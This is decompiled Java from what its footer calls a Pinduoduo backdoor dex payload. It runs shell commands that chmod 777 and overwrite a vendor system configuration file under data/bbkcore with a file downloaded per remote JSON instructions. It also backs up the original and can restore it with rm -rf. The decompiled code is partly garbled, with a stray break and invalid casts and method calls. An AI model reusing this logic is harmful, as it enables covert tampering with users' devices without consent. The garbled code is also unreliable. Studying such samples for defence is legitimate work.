package com.google.android.sd.biz_dynamic_dex.a;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import org.json.JSONArray;
import org.json.JSONObject;

public final class a {
  private static String a = "";
  
  private static String b = "";
  
  private static String c = "";
  
  private static String d = "";
  
  public static String a() {
    c.a("chmod 777 data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
    c.a("chmod 777 data/bbkcore/.config12ebf.xml");
    String str = c.a("md5sum data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
    if (!TextUtils.isEmpty(str) && str.contains(a)) {
      c.a("rm -rf data/bbkcore/.config12ebf.xml");
      return "success";
    } 
    if (!TextUtils.isEmpty(str) && str.contains(b)) {
      c.a("cp -rf data/bbkcore/.config12ebf.xml data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
      c.a("rm -rf data/bbkcore/.config12ebf.xml");
      str = c.a("md5sum data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
      return (!TextUtils.isEmpty(str) && str.contains(a)) ? "success" : "error_recover_fail";
    } 
    return "error_not_target_recover_md5";
  }
  
  public static String a(Context paramContext, JSONObject paramJSONObject) {
    String str1;
    StringBuilder stringBuilder;
    if (paramJSONObject == null)
      return "error_json_null"; 
    c.a("chmod 777 data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
    String str2 = c.a("md5sum data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
    if (TextUtils.isEmpty(str2))
      return "empty_local_md5_".concat(String.valueOf(str2)); 
    if (!paramJSONObject.has("config_list")) {
      a = paramJSONObject.optString("old_md5", "");
      b = paramJSONObject.optString("new_md5", "");
      c = paramJSONObject.optString("url_type", "");
      str1 = paramJSONObject.optString("url_suffix", "");
    } else {
      JSONArray jSONArray = str1.optJSONArray("config_list");
      if (jSONArray != null) {
        int i = 0;
        while (true) {
          String str;
          if (i < jSONArray.length()) {
            JSONObject jSONObject = jSONArray.optJSONObject(i);
            String str3 = jSONObject.optString("old_md5", "");
            if (str2.contains(str3)) {
              a = str3;
              b = jSONObject.optString("new_md5", "");
              c = jSONObject.optString("url_type", "");
              str = jSONObject.optString("url_suffix", "");
            } else {
              i++;
              continue;
            } 
          } else {
            break;
          } 
          d = str;
          break;
        } 
      } 
      if (TextUtils.isEmpty(a) || TextUtils.isEmpty(b) || TextUtils.isEmpty(c) || TextUtils.isEmpty(d))
        return "input_not_match_".concat(String.valueOf(str2)); 
      if (TextUtils.isEmpty(str2) || !str2.contains(a))
        return "error_md5_not_match_".concat(String.valueOf(str2)); 
      File file = new File(paramContext.getFilesDir(), ".config1352c.xml");
      try {
        Utils.downloadFile(paramContext, c, d, file, b);
        if (!file.exists() || file.length() <= 0L)
          return "error_download_fail"; 
        if (!TextUtils.equals(com.google.android.sd.biz_dynamic_dex.base.a.a(file), b))
          return "error_download_md5_not_match"; 
        File file1 = new File("data/bbkcore/", ".config1352c.xml");
        boolean bool = com.google.android.sd.biz_dynamic_dex.base.a.a(file, file1);
        str2 = com.google.android.sd.biz_dynamic_dex.base.a.a(file1);
        file.delete();
        if (!bool || TextUtils.isEmpty(str2) || !TextUtils.equals(str2, b)) {
          file1.delete();
          return "error_copy_sd_fail";
        } 
        c.a("cp -rf data/bbkcore/AmsConfigManager_amsconfig_1.0.xml data/bbkcore/.config12ebf.xml");
        String str4 = c.a("md5sum data/bbkcore/.config12ebf.xml");
        if (TextUtils.isEmpty(str4) || !str4.contains(a)) {
          c.a("rm -rf data/bbkcore/.config12ebf.xml");
          file1.delete();
          return "error_backup_fail";
        } 
        StringBuilder stringBuilder1 = new StringBuilder("chmod 777 ");
        stringBuilder1.append(file1.getAbsolutePath());
        c.a(stringBuilder1.toString());
        stringBuilder1 = new StringBuilder("cp -rf ");
        stringBuilder1.append(file1.getAbsolutePath());
        stringBuilder1.append(" data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
        c.a(stringBuilder1.toString());
        String str3 = c.a("md5sum data/bbkcore/AmsConfigManager_amsconfig_1.0.xml");
        file1.delete();
        return (!TextUtils.isEmpty(str3) && str3.contains(b)) ? "success" : "error_replace_fail";
      } catch (Exception exception) {
        stringBuilder = new StringBuilder("error_download_");
        stringBuilder.append(exception.getMessage());
        return stringBuilder.toString();
      } 
    } 
    d = (String)stringBuilder;
    break;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7877ec6850344e7aad5fdd57f6abf238-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\a\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */